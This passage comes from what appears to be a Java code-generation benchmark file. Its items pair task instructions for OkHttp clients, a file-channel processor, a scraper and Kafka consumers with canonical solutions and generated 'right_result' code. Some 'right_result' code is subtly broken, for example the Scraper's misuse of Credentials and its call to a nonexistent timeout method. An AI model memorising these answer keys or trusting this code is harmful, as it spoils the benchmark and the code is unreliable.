}\n\n    protected JsonResult postJson(String url, JsonNode requestJson) throws IOException {\n        Request okRequest = new Request.Builder().url(url)\n                .header(X_GH_CLIENT_VERSION, GH_VERSION_FROM_MAVEN)\n                .post(createRequestBody(requestJson))\n                .build();\n        ResponseBody body = null;\n        try {\n            Response rsp = client.newCall(okRequest).execute();\n            body = rsp.body();\n            return new JsonResult(body.string(), rsp.code(), rsp.headers().toMultimap());\n        } finally {\n            if (body != null) {\n                body.close();\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "right_result": "```java\nimport okhttp3.*;\nimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\nimport com.fasterxml.jackson.databind.JsonNode;\n\npublic class GHMatrixBatchRequester {\n    private static final Logger logger = LogManager.getLogger(GHMatrixBatchRequester.class);\n    private final OkHttpClient client;\n\n    public GHMatrixBatchRequester() {\n        this.client = new OkHttpClient.Builder()\n                .connectTimeout(5, TimeUnit.SECONDS)\n                .readTimeout(5, TimeUnit.SECONDS)\n                .build();\n    }\n\n    public GHMatrixBatchRequester(OkHttpClient client) {\n        this.client = client;\n    }\n\n    public JsonResult getJson(String url) {\n        Request request = new Request.Builder()\n                .url(url)\n                .get()\n                .build();\n\n        try (Response response = client.newCall(request).execute()) {\n            return new JsonResult(response.body().string(), response.code(), response.headers());\n        } catch (IOException e) {\n            logger.error(\"Error during GET request\", e);\n            return new JsonResult(null, -1, null);\n        }\n    }\n\n    public JsonResult postJson(String url, JsonNode requestJson) {\n        MediaType JSON = MediaType.get(\"application/json; charset=utf-8\");\n        String jsonBody = requestJson.toString();\n        RequestBody body = RequestBody.create(jsonBody, JSON);\n\n        Request request = new Request.Builder()\n                .url(url)\n                .post(body)\n                .build();\n\n        try (Response response = client.newCall(request).execute()) {\n            return new JsonResult(response.body().string(), response.code(), response.headers());\n        } catch (IOException e) {\n            logger.error(\"Error during POST request\", e);\n            return new JsonResult(null, -1, null);\n        }\n    }\n\n    public static class JsonResult {\n        private final String responseBody;\n        private final int statusCode;\n        private final Headers headers;\n\n        public JsonResult(String responseBody, int statusCode, Headers headers) {\n            this.responseBody = responseBody;\n            this.statusCode = statusCode;\n            this.headers = headers;\n        }\n\n        // Getters for responseBody, statusCode, and headers\n        public String getResponseBody() {\n            return responseBody;\n        }\n\n        public int getStatusCode() {\n            return statusCode;\n        }\n\n        public Headers getHeaders() {\n            return headers;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 248,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests using OkHttp library, supporting GET and POST methods with configurable headers, parameters, and retry mechanism.\n\nClass Description: HttpUtil is a utility class that provides static methods for making HTTP requests. It handles both GET and POST requests with support for headers, query parameters, and form parameters. The class includes built-in timeout settings and a retry mechanism for failed requests.\n\nAttributes:\n- QUESTION_SEPARATE: String - Constant for URL question mark separator\n- PARAM_SEPARATE: String - Constant for URL parameter separator\n- KV_SEPARATE: String - Constant for key-value separator in URLs\n- client: OkHttpClient - Pre-configured HTTP client instance with timeout settings\n\nMethods:\n- doGet(String url) -> Resp - Executes a GET request to the specified URL\n- doGetWithHeader(String url, Map<String, String> headers) -> Resp - Executes a GET request with custom headers\n- doGet(String url, Map<String, String> params) -> Resp - Executes a GET request with URL parameters\n- doPost(String url) -> Resp - Executes a POST request to the specified URL\n- doPost(String url, Map<String, String> params) -> Resp - Executes a POST request with form parameters\n- executeRequest(Request request, int retryTime) -> Resp - Internal method to execute requests with retry logic\n- bodyToString(ResponseBody body) -> String - Helper method to convert response body to string\n\nNested Class: Resp\n- Description: Represents the HTTP response with status code, body, and optional message\n- Attributes:\n  - code: int - HTTP status code\n  - body: String - Response body content\n  - message: String - Optional message (used for errors)\n- Methods:\n  - builder() -> RespBuilder - Creates a new RespBuilder instance\n  - getCode() -> int - Returns the status code\n  - getBody() -> String - Returns the response body\n  - getMessage() -> String - Returns the message\n\nNested Class: RespBuilder\n- Description: Builder pattern implementation for constructing Resp objects\n- Methods:\n  - code(int code) -> RespBuilder - Sets the status code\n  - body(String body) -> RespBuilder - Sets the response body\n  - message(String message) -> RespBuilder - Sets the message\n  - build() -> Resp - Constructs the Resp object",
    "Canonical_solution": "import okhttp3.*;\nimport org.apache.commons.collections4.MapUtils;\nimport org.apache.commons.lang3.StringUtils;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.TimeUnit;\n\npublic class HttpUtil {\n\n    private static final String QUESTION_SEPARATE = \"?\";\n    private static final String PARAM_SEPARATE = \"&\";\n    private static final String KV_SEPARATE = \"=\";\n\n    private static final OkHttpClient client = new OkHttpClient().newBuilder()\n            .connectTimeout(3, TimeUnit.SECONDS)\n            .readTimeout(10, TimeUnit.SECONDS)\n            .writeTimeout(10, TimeUnit.SECONDS)\n            .build();\n\n    public static Resp doGet(String url) {\n        return executeRequest(new Request.Builder().get().url(url).build());\n    }\n\n    public static Resp doGetWithHeader(String url, Map<String, String> headers) {\n        final Request.Builder builder = new Request.Builder().get().url(url);\n        if (MapUtils.isNotEmpty(headers)) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                builder.header(entry.getKey(), entry.getValue());\n            }\n        }\n        return executeRequest(builder.build());\n    }\n\n    public static Resp doGet(String url, Map<String, String> params) {\n        StringBuilder builder = new StringBuilder(url);\n        if (!StringUtils.contains(url, QUESTION_SEPARATE)) {\n            builder.append(QUESTION_SEPARATE).append(\"_r=1\");\n        }\n        if (MapUtils.isNotEmpty(params)) {\n            for (Map.Entry<String, String> entry : params.entrySet()) {\n                builder.append(PARAM_SEPARATE)\n                        .append(entry.getKey())\n                        .append(KV_SEPARATE)\n                        .append(entry.getValue());\n            }\n        }\n        return doGet(builder.toString());\n    }\n\n    public static Resp doPost(String url) {\n        return doPost(url, null);\n    }\n\n    public static Resp doPost(String url, Map<String, String> params) {\n        FormBody.Builder builder = new FormBody.Builder();\n        if (MapUtils.isNotEmpty(params)) {\n            for (Map.Entry<String, String> entry : params.entrySet()) {\n                builder.add(entry.getKey(), entry.getValue());\n            }\n        }\n        Request request = new Request.Builder().post(builder.build()).url(url).build();\n        return executeRequest(request);\n    }\n\n    private static Resp executeRequest(Request request, int retryTime) {\n        try {\n            Response response = client.newCall(request).execute();\n            if (response.isSuccessful()) {\n                return Resp.builder().code(response.code())\n                        .body(bodyToString(response.body())).build();\n            }\n            if (--retryTime > 0) {\n                TimeUnit.MILLISECONDS.sleep(100);\n                return executeRequest(request, retryTime);\n            }\n            return Resp.builder().code(response.code())\n                    .body(bodyToString(response.body()))\n                    .message(\"Invoke failed, status code is not 200\")\n                    .build();\n        } catch (Exception e) {\n            if (--retryTime > 0) {\n                try {\n                    TimeUnit.MILLISECONDS.sleep(100);\n                } catch (InterruptedException e1) {\n                    // ignore\n                }\n                return executeRequest(request, retryTime);\n            }\n            return Resp.builder().code(500)\n                    .message(\"Invoke occurred exception, request=\" + request.toString() + \";message=\" + e.getMessage())\n                    .build();\n        }\n    }\n\n    private static String bodyToString(ResponseBody body) throws IOException {\n        return body == null ? \"\" : body.string();\n    }\n\n    public static class Resp {\n        private int code;\n        private String body;\n        private String message;\n\n        public static RespBuilder builder() {\n            return new RespBuilder();\n        }\n\n        public static class RespBuilder {\n            private int code;\n            private String body;\n            private String message;\n\n            public RespBuilder code(int code) {\n                this.code = code;\n                return this;\n            }\n\n            public RespBuilder body(String body) {\n                this.body = body;\n                return this;\n            }\n\n            public RespBuilder message(String message) {\n                this.message = message;\n                return this;\n            }\n\n            public Resp build() {\n                return new Resp(code, body, message);\n            }\n        }\n\n        Resp(int code, String body, String message) {\n            this.code = code;\n            this.body = body;\n            this.message = message;\n        }\n\n        public int getCode() {\n            return code;\n        }\n\n        public String getBody() {\n            return body;\n        }\n\n        public String getMessage() {\n            return message;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "right_result": "```java\nimport okhttp3.*;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class HttpUtil {\n    public static final String QUESTION_SEPARATE = \"?\";\n    public static final String PARAM_SEPARATE = \"&\";\n    public static final String KV_SEPARATE = \"=\";\n    private static final OkHttpClient client = new OkHttpClient.Builder()\n            .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)\n            .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)\n            .writeTimeout(10, java.util.concurrent.TimeUnit.SECONDS)\n            .build();\n\n    public static Resp doGet(String url) {\n        return executeRequest(new Request.Builder().url(url).get().build(), 3);\n    }\n\n    public static Resp doGetWithHeader(String url, Map<String, String> headers) {\n        Request.Builder requestBuilder = new Request.Builder().url(url).get();\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            requestBuilder.addHeader(entry.getKey(), entry.getValue());\n        }\n        return executeRequest(requestBuilder.build(), 3);\n    }\n\n    public static Resp doGet(String url, Map<String, String> params) {\n        StringBuilder urlBuilder = new StringBuilder(url);\n        if (!params.isEmpty()) {\n            urlBuilder.append(QUESTION_SEPARATE);\n            for (Map.Entry<String, String> entry : params.entrySet()) {\n                urlBuilder.append(entry.getKey()).append(KV_SEPARATE).append(entry.getValue()).append(PARAM_SEPARATE);\n            }\n            urlBuilder.deleteCharAt(urlBuilder.length() - 1);\n        }\n        return executeRequest(new Request.Builder().url(urlBuilder.toString()).get().build(), 3);\n    }\n\n    public static Resp doPost(String url) {\n        return doPost(url, new HashMap<>());\n    }\n\n    public static Resp doPost(String url, Map<String, String> params) {\n        FormBody.Builder formBodyBuilder = new FormBody.Builder();\n        for (Map.Entry<String, String> entry : params.entrySet()) {\n            formBodyBuilder.add(entry.getKey(), entry.getValue());\n        }\n        RequestBody requestBody = formBodyBuilder.build();\n        return executeRequest(new Request.Builder().url(url).post(requestBody).build(), 3);\n    }\n\n    private static Resp executeRequest(Request request, int retryTime) {\n        try {\n            Response response = client.newCall(request).execute();\n            return Resp.builder()\n                    .code(response.code())\n                    .body(bodyToString(response.body()))\n                    .build();\n        } catch (IOException e) {\n            if (retryTime > 0) {\n                return executeRequest(request, retryTime - 1);\n            } else {\n                return Resp.builder()\n                        .code(-1)\n                        .message(e.getMessage())\n                        .build();\n            }\n        }\n    }\n\n    private static String bodyToString(ResponseBody body) throws IOException {\n        return body != null ? body.string() : \"\";\n    }\n\n    public static class Resp {\n        private int code;\n        private String body;\n        private String message;\n\n        private Resp(RespBuilder builder) {\n            this.code = builder.code;\n            this.body = builder.body;\n            this.message = builder.message;\n        }\n\n        public static RespBuilder builder() {\n            return new RespBuilder();\n        }\n\n        public int getCode() {\n            return code;\n        }\n\n        public String getBody() {\n            return body;\n        }\n\n        public String getMessage() {\n            return message;\n        }\n    }\n\n    public static class RespBuilder {\n        private int code;\n        private String body;\n        private String message;\n\n        public RespBuilder code(int code) {\n            this.code = code;\n            return this;\n        }\n\n        public RespBuilder body(String body) {\n            this.body = body;\n            return this;\n        }\n\n        public RespBuilder message(String message) {\n            this.message = message;\n            return this;\n        }\n\n        public Resp build() {\n            return new Resp(this);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 25,
    "Instruction": "Task Description: Create a Java class that processes large files efficiently using memory-mapped file I/O operations through FileChannel and MappedByteBuffer.\n\nClass Description: FileChannelProcessor is a utility class designed to handle large file processing by mapping portions of a file into memory buffers. It reads files in chunks (up to 500MB each) and ensures each chunk ends at a line boundary for proper text processing.\n\nAttributes:\n- BUFFER_SIZE: int - Constant defining the maximum size (500MB) for each memory-mapped buffer\n- channel: FileChannel - The file channel used for file operations\n- buffers: List<Buffer> - List of buffers containing mapped portions of the file\n\nMethods:\n- FileChannelProcessor(Path filePath) -> void - Constructor that initializes the FileChannel by opening the specified file\n- createBuffers() -> List<Buffer> - Creates memory-mapped buffers for the file, ensuring each buffer ends at a line boundary\n- close() -> void - Closes the FileChannel to release system resources\n\nNested Record:\n- Buffer(ByteBuffer byteBuffer, int length) - A record holding a ByteBuffer and its effective length (up to the last newline character)",
    "Canonical_solution": "import java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.util.ArrayList;\nimport java.util.List;\n\nimport static java.nio.channels.FileChannel.MapMode.READ_ONLY;\n\npublic class FileChannelProcessor {\n    private static final int BUFFER_SIZE = (1 << 29); // 500mb\n    private final FileChannel channel;\n    private final List<Buffer> buffers = new ArrayList<>();\n\n    public FileChannelProcessor(Path filePath) throws Exception {\n        this.channel = FileChannel.open(filePath);\n    }\n\n    public List<Buffer> createBuffers() throws Exception {\n        long size = channel.size();\n        int lastByte;\n        for (long offset = 0; offset < size; offset += lastByte + 1) {\n            long sizeToMap = Math.min(size - offset, BUFFER_SIZE);\n            MappedByteBuffer buffer = channel.map(READ_ONLY, offset, sizeToMap);\n            lastByte = (int) sizeToMap - 1;\n            while (buffer.get(lastByte) != '\\n')\n                --lastByte;\n            buffers.add(new Buffer(buffer, lastByte + 1));\n        }\n        return buffers;\n    }\n\n    public void close() throws Exception {\n        channel.close();\n    }\n\n    public record Buffer(ByteBuffer byteBuffer, int length) {\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class FileChannelProcessor {\n    private static final int BUFFER_SIZE = 500 * 1024 * 1024; // 500MB\n    private FileChannel channel;\n    private List<Buffer> buffers;\n\n    public FileChannelProcessor(Path filePath) throws IOException {\n        this.channel = FileChannel.open(filePath, StandardOpenOption.READ);\n        this.buffers = createBuffers();\n    }\n\n    public List<Buffer> createBuffers() throws IOException {\n        List<Buffer> result = new ArrayList<>();\n        ByteBuffer buffer = ByteBuffer.allocate(BUFFER_SIZE);\n        while (channel.read(buffer) > 0) {\n            buffer.flip();\n            int endOfLineIndex = findEndOfLineIndex(buffer);\n            if (endOfLineIndex != -1) {\n                ByteBuffer validBuffer = buffer.slice(0, endOfLineIndex + 1);\n                result.add(new Buffer(validBuffer, endOfLineIndex + 1));\n                buffer.position(endOfLineIndex + 1);\n            }\n            if (!buffer.hasRemaining()) {\n                buffer.clear();\n            } else {\n                break;\n            }\n        }\n        return result;\n    }\n\n    public void close() throws IOException {\n        channel.close();\n    }\n\n    private int findEndOfLineIndex(ByteBuffer buffer) {\n        for (int i = 0; i < buffer.limit(); i++) {\n            if (buffer.get(i) == '\\n') {\n                return i;\n            }\n        }\n        return -1;\n    }\n\n    public record Buffer(ByteBuffer byteBuffer, int length) {}\n}\n```"
  },
  {
    "Task_id": 250,
    "Instruction": "Task Description: Create a Java class that implements a web scraper using the OkHttp library to make HTTP requests, handle authentication, and process responses with retry logic for failed attempts.\n\nClass Description: The Scraper class provides functionality to scrape content from web URLs using HTTP requests. It supports basic authentication and includes timeout handling with retry logic for failed requests.\n\nAttributes:\n- client: OkHttpClient - The HTTP client instance used to make requests\n\nMethods:\n- Scraper() -> None - Constructor that initializes the OkHttpClient instance\n- scrape(String url, long timeoutMillis) -> List<String> - Scrapes content from the given URL without authentication, with a specified timeout\n- scrape(String url, String user, String password, long timeoutMillis) -> List<String> - Scrapes content from the given URL with basic authentication, with a specified timeout",
    "Canonical_solution": "import okhttp3.Credentials;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport java.io.IOException;\nimport java.util.Arrays;\nimport java.util.List;\n\npublic class Scraper {\n\n    private OkHttpClient client;\n    \n    public Scraper() {\n        this.client = new OkHttpClient();\n    }\n\n    public List<String> scrape(String url, long timeoutMillis) {\n        return scrape(url, null, null, timeoutMillis);\n    }\n\n    public List<String> scrape(String url, String user, String password, long timeoutMillis) {\n        long start = System.currentTimeMillis();\n        Exception exception = null;\n        while (System.currentTimeMillis() - start < timeoutMillis) {\n            try {\n                Request.Builder requestBuilder = new Request.Builder()\n                        .header(\"Accept\", \"application/openmetrics-text; version=1.0.0; charset=utf-8\")\n                        .url(url);\n                if (user != null && password != null) {\n                    requestBuilder.header(\"Authorization\", Credentials.basic(user, password));\n                }\n                Request request = requestBuilder.build();\n                try (Response response = client.newCall(request).execute()) {\n                    if (response.code() != 200) {\n                        throw new IOException(\"Received HTTP Status \" + response.code() + \": \" + response.body().string());\n                    }\n                    return Arrays.asList(response.body().string().split(\"\\\\n\"));\n                }\n            } catch (Exception e) {\n                exception = e;\n                try {\n                    Thread.sleep(100);\n                } catch (InterruptedException ignored) {\n                }\n            }\n        }\n        if (exception != null) {\n            exception.printStackTrace();\n        }\n        return null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "right_result": "```java\nimport okhttp3.*;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class Scraper {\n    private final OkHttpClient client;\n\n    public Scraper() {\n        this.client = new OkHttpClient.Builder()\n                .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)\n                .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)\n                .writeTimeout(10, java.util.concurrent.TimeUnit.SECONDS)\n                .build();\n    }\n\n    public List<String> scrape(String url, long timeoutMillis) throws IOException {\n        return executeRequest(url, null, null, timeoutMillis);\n    }\n\n    public List<String> scrape(String url, String user, String password, long timeoutMillis) throws IOException {\n        Credentials credentials = Credentials.basic(user, password);\n        return executeRequest(url, credentials, null, timeoutMillis);\n    }\n\n    private List<String> executeRequest(String url, Credentials credentials, RequestBody body, long timeoutMillis) throws IOException {\n        Request request = new Request.Builder()\n                .url(url)\n                .headers(credentials != null ? headersWithAuth(credentials) : Headers.of())\n                .post(body)\n                .timeout(timeoutMillis, java.util.concurrent.TimeUnit.MILLISECONDS)\n                .build();\n\n        int maxRetries = 3;\n        for (int attempt = 0; attempt < maxRetries; attempt++) {\n            try (Response response = client.newCall(request).execute()) {\n                if (response.isSuccessful()) {\n                    return parseResponse(response.body().string());\n                } else {\n                    throw new IOException(\"Unexpected code \" + response);\n                }\n            } catch (IOException e) {\n                if (attempt == maxRetries - 1) {\n                    throw e;\n                }\n            }\n        }\n        throw new IOException(\"Max retries reached\");\n    }\n\n    private Headers headersWithAuth(Credentials credentials) {\n        return new Headers.Builder()\n                .add(\"Authorization\", credentials.toString())\n                .build();\n    }\n\n    private List<String> parseResponse(String responseBody) {\n        // Implement parsing logic here\n        List<String> lines = new ArrayList<>();\n        for (String line : responseBody.split(\"\\n\")) {\n            lines.add(line.trim());\n        }\n        return lines;\n    }\n}\n```"
  },
  {
    "Task_id": 252,
    "Instruction": "Task Description: Create a Java class that implements a Kafka consumer thread for reading and processing messages from a Kafka topic, with support for message validation and local store updates.\n\nClass Description: KafkaStoreReaderThread is a thread-based Kafka consumer that reads messages from a specified topic, validates them using a handler, and updates a local store accordingly. It maintains offset tracking and provides shutdown capabilities.\n\nAttributes:\n- topic: String - The Kafka topic to consume messages from\n- topicPartition: TopicPartition - The topic partition being consumed\n- groupId: String - The consumer group ID\n- storeUpdateHandler: StoreUpdateHandler<K, V> - Handler for message validation\n- serializer: Serializer<K, V> - Serializer for message keys and values\n- localStore: Store<K, V> - Local storage for processed messages\n- offsetUpdateLock: ReentrantLock - Lock for thread-safe offset updates\n- offsetReachedThreshold: Condition - Condition for offset tracking\n- consumer: Consumer<byte[], byte[]> - Kafka consumer instance\n- offsetInSchemasTopic: long - Current offset in the topic\n- consumerProps: Properties - Configuration properties for the Kafka consumer\n\nMethods:\n- KafkaStoreReaderThread(String bootstrapBrokers, String topic, String groupId, StoreUpdateHandler<K, V> storeUpdateHandler, Serializer<K, V> serializer, Store<K, V> localStore) -> void - Constructor that initializes the consumer with configuration and dependencies\n- doWork() -> void - Main work method that polls for messages, processes them, and updates the local store\n- shutdown() -> void - Gracefully shuts down the consumer thread",
    "Canonical_solution": "import io.confluent.kafka.schemaregistry.storage.StoreUpdateHandler.ValidationStatus;\nimport io.confluent.kafka.schemaregistry.utils.ShutdownableThread;\nimport org.apache.kafka.clients.consumer.Consumer;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.clients.consumer.ConsumerRecords;\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.common.KafkaException;\nimport org.apache.kafka.common.PartitionInfo;\nimport org.apache.kafka.common.TopicPartition;\nimport org.apache.kafka.common.errors.RecordTooLargeException;\nimport org.apache.kafka.common.errors.WakeupException;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.util.List;\nimport java.util.Properties;\nimport java.util.Arrays;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.locks.Condition;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class KafkaStoreReaderThread<K, V> extends ShutdownableThread {\n\n  private static final Logger log = LoggerFactory.getLogger(KafkaStoreReaderThread.class);\n\n  private final String topic;\n  private final TopicPartition topicPartition;\n  private final String groupId;\n  private final StoreUpdateHandler<K, V> storeUpdateHandler;\n  private final Serializer<K, V> serializer;\n  private final Store<K, V> localStore;\n  private final ReentrantLock offsetUpdateLock;\n  private final Condition offsetReachedThreshold;\n  private Consumer<byte[], byte[]> consumer;\n  private long offsetInSchemasTopic = -1L;\n  private Properties consumerProps = new Properties();\n\n  public KafkaStoreReaderThread(String bootstrapBrokers,\n                              String topic,\n                              String groupId,\n                              StoreUpdateHandler<K, V> storeUpdateHandler,\n                              Serializer<K, V> serializer,\n                              Store<K, V> localStore) {\n    super(\"kafka-store-reader-thread-\" + topic, false);\n    offsetUpdateLock = new ReentrantLock();\n    offsetReachedThreshold = offsetUpdateLock.newCondition();\n    this.topic = topic;\n    this.groupId = groupId;\n    this.storeUpdateHandler = storeUpdateHandler;\n    this.serializer = serializer;\n    this.localStore = localStore;\n\n    consumerProps.put(ConsumerConfig.GROUP_ID_CONFIG, this.groupId);\n    consumerProps.put(ConsumerConfig.CLIENT_ID_CONFIG, \"KafkaStore-reader-\" + this.topic);\n    consumerProps.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapBrokers);\n    consumerProps.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, \"earliest\");\n    consumerProps.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, \"false\");\n    consumerProps.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG,\n                    org.apache.kafka.common.serialization.ByteArrayDeserializer.class);\n    consumerProps.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG,\n                    org.apache.kafka.common.serialization.ByteArrayDeserializer.class);\n\n    this.consumer = new KafkaConsumer<>(consumerProps);\n    this.topicPartition = new TopicPartition(topic, 0);\n    List<TopicPartition> topicPartitions = Arrays.asList(this.topicPartition);\n    this.consumer.assign(topicPartitions);\n    consumer.seekToBeginning(topicPartitions);\n  }\n\n  @Override\n  public void doWork() {\n    try {\n      ConsumerRecords<byte[], byte[]> records = consumer.poll(Duration.ofMillis(Long.MAX_VALUE));\n      for (ConsumerRecord<byte[], byte[]> record : records) {\n        K messageKey = this.serializer.deserializeKey(record.key());\n        V message = record.value() == null ? null : serializer.deserializeValue(messageKey, record.value());\n        \n        TopicPartition tp = new TopicPartition(record.topic(), record.partition());\n        long offset = record.offset();\n        long timestamp = record.timestamp();\n        ValidationStatus status = this.storeUpdateHandler.validateUpdate(\n                messageKey, message, tp, offset, timestamp);\n        \n        if (status == ValidationStatus.SUCCESS) {\n          if (message == null) {\n            localStore.delete(messageKey);\n          } else {\n            localStore.put(messageKey, message);\n          }\n        }\n\n        try {\n          offsetUpdateLock.lock();\n          offsetInSchemasTopic = record.offset();\n          offsetReachedThreshold.signalAll();\n        } finally {\n          offsetUpdateLock.unlock();\n        }\n      }\n    } catch (WakeupException we) {\n      // Thread is closing\n    } catch (RecordTooLargeException rtle) {\n      throw new IllegalStateException(\"Consumer threw RecordTooLargeException\", rtle);\n    } catch (RuntimeException e) {\n      log.error(\"KafkaStoreReader thread has died\", e);\n      throw e;\n    }\n  }\n\n  @Override\n  public void shutdown() {\n    super.initiateShutdown();\n    if (consumer != null) {\n      consumer.wakeup();\n    }\n    super.awaitShutdown();\n    if (consumer != null) {\n      consumer.close();\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 32,
    "right_result": "```java\nimport org.apache.kafka.clients.consumer.Consumer;\nimport org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.consumer.ConsumerRecords;\nimport org.apache.kafka.common.TopicPartition;\nimport java.util.Properties;\nimport java.util.concurrent.locks.Condition;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class KafkaStoreReaderThread<K, V> extends Thread {\n    private final String topic;\n    private final TopicPartition topicPartition;\n    private final String groupId;\n    private final StoreUpdateHandler<K, V> storeUpdateHandler;\n    private final Serializer<K, V> serializer;\n    private final Store<K, V> localStore;\n    private final ReentrantLock offsetUpdateLock = new ReentrantLock();\n    private final Condition offsetReachedThreshold = offsetUpdateLock.newCondition();\n    private Consumer<byte[], byte[]> consumer;\n    private long offsetInSchemasTopic;\n    private Properties consumerProps;\n\n    public KafkaStoreReaderThread(String bootstrapBrokers, String topic, String groupId, StoreUpdateHandler<K, V> storeUpdateHandler, Serializer<K, V> serializer, Store<K, V> localStore) {\n        this.topic = topic;\n        this.groupId = groupId;\n        this.storeUpdateHandler = storeUpdateHandler;\n        this.serializer = serializer;\n        this.localStore = localStore;\n        consumerProps = new Properties();\n        consumerProps.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapBrokers);\n        consumerProps.put(ConsumerConfig.GROUP_ID_CONFIG, groupId);\n        consumerProps.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, \"org.apache.kafka.common.serialization.ByteArrayDeserializer\");\n        consumerProps.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, \"org.apache.kafka.common.serialization.ByteArrayDeserializer\");\n        consumer = new KafkaConsumer<>(consumerProps);\n        topicPartition = new TopicPartition(topic, 0);\n        consumer.assign(java.util.Collections.singletonList(topicPartition));\n    }\n\n    @Override\n    public void run() {\n        doWork();\n    }\n\n    private void doWork() {\n        try {\n            while (!isInterrupted()) {\n                ConsumerRecords<byte[], byte[]> records = consumer.poll(Duration.ofMillis(100));\n                for (ConsumerRecord<byte[], byte[]> record : records) {\n                    K key = serializer.deserializeKey(record.key());\n                    V value = serializer.deserializeValue(record.value());\n                    if (storeUpdateHandler.validate(key, value)) {\n                        localStore.update(key, value);\n                    }\n                    updateOffset(record.offset());\n                }\n            }\n        } finally {\n            consumer.close();\n        }\n    }\n\n    private void updateOffset(long offset) {\n        offsetUpdateLock.lock();\n        try {\n            offsetInSchemasTopic = offset;\n            offsetReachedThreshold.signalAll();\n        } finally {\n            offsetUpdateLock.unlock();\n        }\n    }\n\n    public void shutdown() {\n        interrupt();\n        try {\n            join();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 253,
    "Instruction": "Task Description: Create a Kafka consumer class in Java that continuously polls messages from a specified Kafka topic and processes them asynchronously. The class should handle initialization and cleanup properly, and allow for graceful shutdown.\n\nClass Description: KafkaConsumeOrderWorkaround is a Spring component that implements a Kafka consumer worker thread. It consumes messages from a configured Kafka topic, commits offsets asynchronously, and can be gracefully stopped. The consumer runs in a separate thread to avoid blocking the main application.\n\nAttributes:\n- bootstrapServers: String - Kafka broker addresses injected from configuration\n- topicName: String - Kafka topic name to subscribe to, injected from configuration\n- consumerGroup: String - Consumer group ID (default: \"order\")\n- consumer: Consumer<Long, String> - Kafka consumer instance\n- pollingInterval: long - Polling interval in milliseconds (default: 250ms)\n- running: boolean - Flag to control the consumer thread's execution\n- consumerThread: Thread - The thread running the Kafka consumer\n\nMethods:\n- startConsuming() -> void - Initializes and starts the Kafka consumer thread. Configures consumer properties, creates consumer instance, subscribes to topic, and begins polling loop. Annotated with @PostConstruct to run after bean initialization.\n- stopConsuming() -> void - Signals the consumer thread to stop by setting running flag to false. Annotated with @PreDestroy to run before bean destruction.",
    "Canonical_solution": "import java.util.Collections;\nimport java.util.Properties;\nimport javax.annotation.PostConstruct;\nimport javax.annotation.PreDestroy;\nimport org.apache.kafka.clients.consumer.Consumer;\nimport org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.common.serialization.StringDeserializer;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class KafkaConsumeOrderWorkaround {\n\n    @Value(\"${spring.cloud.stream.kafka.binder.brokers}\")\n    private String bootstrapServers;\n\n    @Value(\"${spring.cloud.stream.bindings.input.destination}\")\n    private String topicName;\n\n    private String consumerGroup = \"order\";\n    private Consumer<Long, String> consumer;\n    private long pollingInterval = 250;\n    private boolean running = true;\n    private Thread consumerThread;\n\n    @PostConstruct\n    public void startConsuming() {\n        consumerThread = new Thread(\"kafka-workaround-consumer\") {\n            public void run() {\n                final Properties props = new Properties();\n                props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n                props.put(ConsumerConfig.GROUP_ID_CONFIG, consumerGroup);\n                props.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());\n                props.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());\n\n                consumer = new KafkaConsumer<>(props);\n                consumer.subscribe(Collections.singletonList(topicName));\n                while (running) {\n                    